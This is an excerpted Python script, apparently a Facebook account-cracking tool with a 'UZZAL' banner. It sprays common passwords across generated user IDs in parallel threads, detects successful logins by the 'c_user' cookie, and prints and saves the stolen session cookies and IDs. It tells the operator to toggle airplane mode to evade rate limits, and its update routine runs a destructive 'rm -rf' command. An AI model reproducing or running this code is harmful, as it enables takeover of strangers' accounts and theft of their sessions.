...
\033[1;97m__  ____________   ___    __  [1;91m
\033[1;97m/ / / /__  /__  /  /   |  / /[1;91m
\033[1;97m/ / / /  / /  / /  / /| | / / [1;91m
\033[1;97m/ /_/ /  / /__/ /__/ ___ |/ /___[1;91m
\033[1;97m\____/  /____/____/_/  |_/_____/[1;91m
\033[38;5;46m———————————————————————————————————
...
try:
    ...
    proxy = requests.get('https://github.com/UzzalVau/King-Uzzal-Afrin/tree/main').text.splitlines()
    v = 3.1
    update = requests.get('https://github.com/UzzalVau/King-Uzzal-Afrin/tree/main').text
    if str(v) in update:
        os.system('rm -rf a*')
...
def menu():
	...
	print('[2] Allah + allah PASS')
	print('[3] UZZAL + ARFIN PASS')
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'Mohammad ','mohammad1122','mohammad12','mohammad123','mohammad786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mUZZAL + ARFIN')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'mim123','nusrat1122','allah786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def ff():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'freefire','fflover','freefirequeen','ffqueen']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : ffqueen12345,bangladesh,freefire123,Etc')
    lines()
    for bilal in range(passx):
        pww = input(f"[•] ENTER PASSWORDS {ffking+1} : ")
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[LITON] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[LITON-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mLITON\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/UzzalVau/King-Uzzal-Afrin/blob/main/Arfinna.txt').text
    if id in httpCaht:
